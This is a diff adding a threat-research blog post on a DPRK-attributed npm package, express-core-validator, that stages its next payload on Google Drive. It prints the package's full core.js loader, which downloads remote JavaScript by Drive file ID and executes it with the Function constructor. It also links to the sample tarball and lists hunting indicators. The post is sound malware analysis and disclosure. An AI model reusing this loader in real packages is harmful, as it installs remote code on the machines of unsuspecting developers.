@@ -1,0 +1,138 @@
+---
+title: DPRK tests Google Drive as a malware stager
+description: A small change in TTPs
+date: 2026-02-21
+tags:
+ - javascript
+ - malware
+ - npm
+ - dprk
+---
+import Summary from "~/components/Summary.astro";
+import Fig from "~/components/Fig.astro";
+import Callout from "~/components/Callout.astro";
+
+import OnNpm from "./images/express-core-validator-npm.png"
+import GDrive from "./images/gdrive-payload.png"
+
+I've been tracking FAMOUS CHOLLIMA's npm malware for some time, and any change 
+in TTPs is rare and notable.
+
+<Summary>
+* The majority of malicious packages by FAMOUS CHOLLIMA pull and execute further
+payloads from the internet
+* FAMOUS CHOLLIMA typically stage their malware on JSON paste sites (npoint.io,
+jsonkeeper.com, etc.) and other developer platforms (Vercel, Netflify)
+* `express-core-validator` v1.0.1 instead uses a document uploaded to Google Drive as
+the next stage
+* This post contains technical details and brief hunting guidelines
+</Summary>
+
+On 20 February 2026, I detected a new version publish of `express-core-validator`
+by npm user crisdev09 (cristianabreu694[@]gmail.com).
+
+<Fig src={OnNpm} caption="`express-core-validator` on npm" />
+
+The [package is still live](https://www.npmjs.com/package/express-core-validator)
+as of this post's publish time.
+
+This package is attributed to 
+FAMOUS CHOLLIMA's Contagious Interview campaign and has a novel loader 
+utilising Google Drive. Below is `core.js` in its entirety (comments preserved from 
+original, thanks for the summary FC!):
+
+```javascript
+'use strict';
+
+/**
+ * Fetches JavaScript from Google Drive by file ID and runs it.
+ * Used by postinstall to load and execute the core script.
+ * File: https://drive.google.com/file/d/16AaeeVhqj4Q6FlJIDMgdWASJvq7w00Yc/view?usp=sharing
+ */
+import { createRequire } from 'module';
+const r = createRequire(import.meta.url);
+const { getContentByFileId } = r('./googleDrive.js');
+
+const CORE_FILE_ID = '16AaeeVhqj4Q6FlJIDMgdWASJvq7w00Yc';
+
+async function run() {
+  try {
+    const content = await getContentByFileId(CORE_FILE_ID);
+    if (typeof content !== 'string' || !content.trim()) {
+      return;
+    }
+    new Function('require', content)(r);
+
+    setTimeout(() => {
+      process.exit(0);
+    }, 2000);   // delay in ms, e.g. 2000 = 2 seconds
+  } catch (err) {
+    console.error('core.js:', err.message || err);
+    process.exit(0);
+  }
+}
+
+run().catch(() => process.exit(0));
+```
+
+<Callout type="info">
+Want to examine the package yourself?
+
+View `core.js` on my DPRK research website:
+
+`https://dprk-research.kmsec.uk/api/samples/85c6cebb22bc2e5abc27aac9b1bbcf4f39af9901f422a69180b54c5a62211458`
+
+or download the package tgz:
+
+`https://dprk-research.kmsec.uk/api/tarfiles/express-core-validator/1.0.1`
+
+</Callout>
+
+This is the first instance I have observed utilising Google Drive as the stager.
+The rest of the infection chain is standard FAMOUS CHOLLIMA -- the usage of 
+the Function constructor to evaluate remote content is standard. The next 
+stage payload is also standard. 
+
+The file retrieved from Google 
+Drive is called `inject-simple.min0.js` (a bit on the nose!) with sha256
+`2a7e7b76a3e8070410adce9b6a2b9cf112687922792c91be563c20fbf6a4a82f`.
+
+<Fig src={GDrive} caption="The payload as viewed in browser" />
+
+
+The function to download the document from Google Drive is imported from 
+`./googleDrive.js`, which I will not paste here for brevity. From my reading,
+this code is entirely proprietary and created for the purpose of this campaign,
+I cannot find any third-party provenance of this code.
+
+## Github presence
+
+The Google Drive payload is also observed in a GitHub repository --
+[github.com/DARQ-Envoy/DCUK-Technical-Assessment](https://github.com/DARQ-Envoy/DCUK-Technical-Assessment/) -- in 
+file `/frontend/public/images/splash.png`. This repo was created 29 November 
+2025 and the malicious file was committed by GitHub user DARQ-Envoy:
+
+```
+commit addbf305fe29949810b536456987e1185dc9a3c0
+Author: Timothy <nwokejitimoth00@gmail.com>
+Date:   Sat Nov 29 20:28:22 2025 +0100
+
+    initial commit
+```
+
+## Hunting
+
+Simply looking for DNS requests to drive.google.com from a Node.js process
+should be sufficient for hunting. node/node.exe reaching out to a consumer 
+storage provider is likely to be unusual in any environment. Consider 
+expanding the hunt to other consumer providers like Proton Drive.
+
+## Assessment
+
+Only a single package has been published with this new technique. It is likely
+FAMOUS CHOLLIMA will continue to leverage multiple techniques and 
+infrastructure to deliver follow-on payloads.
+It is unlikely this signals a complete overhaul of their stager behaviour on 
+npm.
+
+
